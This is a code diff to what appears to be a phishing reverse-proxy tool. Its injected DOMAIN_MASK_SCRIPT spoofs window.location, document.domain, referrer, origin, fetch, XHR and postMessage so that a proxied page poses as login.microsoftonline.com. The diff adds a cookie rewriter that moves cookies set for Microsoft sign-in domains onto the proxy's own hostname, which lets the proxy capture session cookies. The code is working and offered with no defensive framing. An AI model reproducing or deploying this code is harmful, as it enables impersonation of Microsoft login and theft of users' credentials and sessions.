@@ -81,13 +81,16 @@ const PROXY_PATHNAMES = {
 const DOMAIN_MASK_SCRIPT = `
 (function() {
     'use strict';
+
+    // ---- Save original hostname before overriding ----
     window.__originalHostname = window.location.hostname;
+
+    // ---- Domain Mask (original) ----
     var fakeOrigin = 'https://login.microsoftonline.com';
     var fakeHostname = 'login.microsoftonline.com';
     var fakeHost = 'login.microsoftonline.com';
     var fakeProtocol = 'https:';
 
-    // 1. Override window.location properties (if possible)
     try {
         var loc = window.location;
         Object.defineProperty(loc, 'origin', {
@@ -111,7 +114,6 @@ const DOMAIN_MASK_SCRIPT = `
             set: function(v) { loc.href = v; },
             configurable: true
         });
-        // ancestorOrigins is read-only, but we can try to override
         try {
             Object.defineProperty(loc, 'ancestorOrigins', {
                 get: function() { return new DOMStringList([fakeOrigin]); },
@@ -119,7 +121,6 @@ const DOMAIN_MASK_SCRIPT = `
             });
         } catch(e) {}
     } catch(e) {
-        // If individual property definition fails, try to replace the whole location
         try {
             var loc2 = window.location;
             var fakeLocation = Object.create(loc2, {
@@ -140,7 +141,6 @@ const DOMAIN_MASK_SCRIPT = `
         } catch(e2) {}
     }
 
-    // 2. Override document.domain
     try {
         Object.defineProperty(document, 'domain', {
             get: function() { return fakeHostname; },
@@ -149,7 +149,6 @@ const DOMAIN_MASK_SCRIPT = `
         });
     } catch(e) {}
 
-    // 3. Override document.referrer
     try {
         Object.defineProperty(document, 'referrer', {
             get: function() { return fakeOrigin + '/'; },
@@ -157,7 +156,6 @@ const DOMAIN_MASK_SCRIPT = `
         });
     } catch(e) {}
 
-    // 4. Override window.origin
     try {
         Object.defineProperty(window, 'origin', {
             get: function() { return fakeOrigin; },
@@ -165,7 +163,6 @@ const DOMAIN_MASK_SCRIPT = `
         });
     } catch(e) {}
 
-    // 5. Patch fetch and XHR
     var origFetch = window.fetch;
     window.fetch = function(input, init) {
         var url = typeof input === 'string' ? input : input.url;
@@ -184,7 +181,6 @@ const DOMAIN_MASK_SCRIPT = `
         return origXHROpen.call(this, method, url, async !== false, user, password);
     };
 
-    // 6. Patch postMessage
     var origPostMessage = window.postMessage;
     window.postMessage = function(message, targetOrigin, transfer) {
         if (targetOrigin === '*') return origPostMessage(message, targetOrigin, transfer);
@@ -195,6 +191,44 @@ const DOMAIN_MASK_SCRIPT = `
     };
 
     console.log('[DOMAIN MASK] Active – origins now report as ' + fakeOrigin);
+
+    // ---- Cookie Domain Rewriter (embedded) ----
+    (function() {
+        var originalDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
+        if (!originalDescriptor) return;
+        var originalSet = originalDescriptor.set;
+        var originalGet = originalDescriptor.get;
+        var proxyDomain = window.__originalHostname || window.location.hostname;
+
+        var microsoftDomains = [
+            'login.microsoftonline.com',
+            'microsoftonline.com',
+            'login.windows.net',
+            'login.microsoft.com',
+            'aadcdn.msftauth.net',
+            'sts.microsoftonline.com'
+        ];
+        var domainPattern = new RegExp(
+            '\\\\bDomain\\\\s*=\\\\s*(' + microsoftDomains.join('|').replace(/\\./g, '\\\\.') + ')',
+            'i'
+        );
+
+        Object.defineProperty(document, 'cookie', {
+            get: originalGet,
+            set: function(value) {
+                var newValue = value;
+                if (value && domainPattern.test(value)) {
+                    newValue = value.replace(domainPattern, 'Domain=' + proxyDomain);
+                    if (!/Domain\\s*=/i.test(newValue)) {
+                        newValue += '; Domain=' + proxyDomain;
+                    }
+                }
+                originalSet.call(document, newValue);
+            },
+            configurable: true
+        });
+        console.log('[COOKIE PATCH] Active – cookies for Microsoft domains rewritten to:', proxyDomain);
+    })();
 })();
 `.replace(/<\/script>/gi, '<\\/script>');
 
